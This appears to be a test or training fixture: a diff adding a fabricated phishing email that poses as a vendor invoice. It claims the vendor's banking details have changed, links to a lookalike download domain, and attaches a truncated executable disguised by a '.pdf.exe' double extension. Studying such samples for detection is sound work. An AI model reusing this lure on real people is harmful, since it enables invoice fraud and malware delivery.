@@ -1,0 +1,119 @@
+Delivered-To: accounting@targetcorp.com
+Received: from mail.legitimate-vendor.com (mail.legitimate-vendor.com [203.45.67.89])
+	by mx.google.com with ESMTPS id x9y8z7w6v5u4t3s2
+	for <accounting@targetcorp.com>
+	Wed, 06 Feb 2026 14:12:45 -0800 (PST)
+Received: from smtp-relay.legitimate-vendor.com ([10.0.50.25])
+	by mail.legitimate-vendor.com; Wed, 06 Feb 2026 22:12:40 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=legitimate-vendor.com; s=selector1;
+	h=from:to:subject:date:message-id;
+	bh=FakeBase64Hash1234567890ABCDEF=;
+	b=FakeDKIMSignature1234567890ABCDEFGHIJKLMNOP=
+Return-Path: <billing@legitimate-vendor.com>
+From: "Sarah Martinez - Accounts Receivable" <billing@legitimate-vendor.com>
+To: accounting@targetcorp.com
+Subject: Invoice #INV-2025-4782 - Payment Due 02-10-2025
+Date: Tue, 6 Feb 2026 14:12:40 -0800
+Message-ID: <4782.invoice.2025@legitimate-vendor.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_0001_01DB5E2A.12345678"
+X-Mailer: Microsoft Outlook 16.0
+X-Originating-IP: [203.45.67.89]
+Authentication-Results: mx.google.com;
+	spf=pass (google.com: domain of billing@legitimate-vendor.com designates 203.45.67.89 as permitted sender) smtp.mailfrom=billing@legitimate-vendor.com;
+	dkim=pass header.d=legitimate-vendor.com
+
+------=_NextPart_000_0001_01DB5E2A.12345678
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body { font-family: Calibri, Arial, sans-serif; font-size: 11pt; }
+.header { background-color: #003366; color: white; padding: 15px; }
+.content { padding: 20px; }
+table { border-collapse: collapse; width: 100%; margin: 20px 0; }
+th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+th { background-color: #f2f2f2; }
+.total { font-weight: bold; font-size: 14pt; color: #003366; }
+.footer { font-size: 9pt; color: #666; border-top: 1px solid #ddd; padding-top: 15px; margin-top: 30px; }
+</style>
+</head>
+<body>
+<div class="header">
+<h2>LEGITIMATE VENDOR CORPORATION</h2>
+<p>Accounts Receivable Department</p>
+</div>
+
+<div class="content">
+<p>Dear Accounts Payable,</p>
+
+<p>Please find attached invoice <strong>INV-2025-4782</strong> for services rendered during January 2025.</p>
+
+<table>
+<tr>
+<th>Invoice Number</th>
+<th>Date Issued</th>
+<th>Due Date</th>
+<th>Amount Due</th>
+</tr>
+<tr>
+<td>INV-2025-4782</td>
+<td>02-01-2025</td>
+<td>02-10-2025</td>
+<td class="total">$45,230.00 USD</td>
+</tr>
+</table>
+
+<p><strong>Services Provided:</strong></p>
+<ul>
+<li>Q4 2024 Consulting Services</li>
+<li>January 2025 Maintenance & Support</li>
+<li>Emergency IT Infrastructure Upgrade</li>
+</ul>
+
+<p>Payment terms: Net 10 days. Please remit payment via ACH or wire transfer to avoid late fees (2% per month on overdue balances).</p>
+
+<p><strong>⚠️ IMPORTANT: Our banking details have changed. Please download the updated invoice attachment for new payment instructions.</strong></p>
+
+<p>For your convenience, you can download the complete invoice with updated banking information here:<br>
+<a href="https://legitimate-vendor-secure.com/invoices/download?id=INV-2025-4782&token=a1b2c3d4e5f6" style="color: #0066cc;">Download Invoice INV-2025-4782.pdf</a></p>
+
+<p>If you have any questions regarding this invoice, please contact me directly at:</p>
+<ul>
+<li>Email: sarah.martinez@legitimate-vendor.com</li>
+<li>Phone: (555) 0187-4392</li>
+<li>Direct Line: Extension 4782</li>
+</ul>
+
+<p>Thank you for your prompt attention to this matter.</p>
+
+<p>Best regards,</p>
+
+<p><strong>Sarah Martinez</strong><br>
+Senior Accounts Receivable Specialist<br>
+Legitimate Vendor Corporation<br>
+billing@legitimate-vendor.com<br>
+www.legitimate-vendor.com</p>
+
+<div class="footer">
+<p><em>This email and any attachments are confidential and intended solely for the addressee. If you are not the intended recipient, please notify the sender immediately and delete this message.</em></p>
+<p>Legitimate Vendor Corporation | 1234 Business Park Drive, Suite 500 | Anytown, ST 12345 | Phone: (555) 0100-0000</p>
+</div>
+</div>
+</body>
+</html>
+
+------=_NextPart_000_0001_01DB5E2A.12345678
+Content-Type: application/pdf; name="Invoice_INV-2025-4782.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_INV-2025-4782.pdf.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAADgAAIhCwEJAAASAAAABgAAAAAAAAAA
+[Truncated - This represents malicious executable disguised as PDF]
+
+------=_NextPart_000_0001_01DB5E2A.12345678--
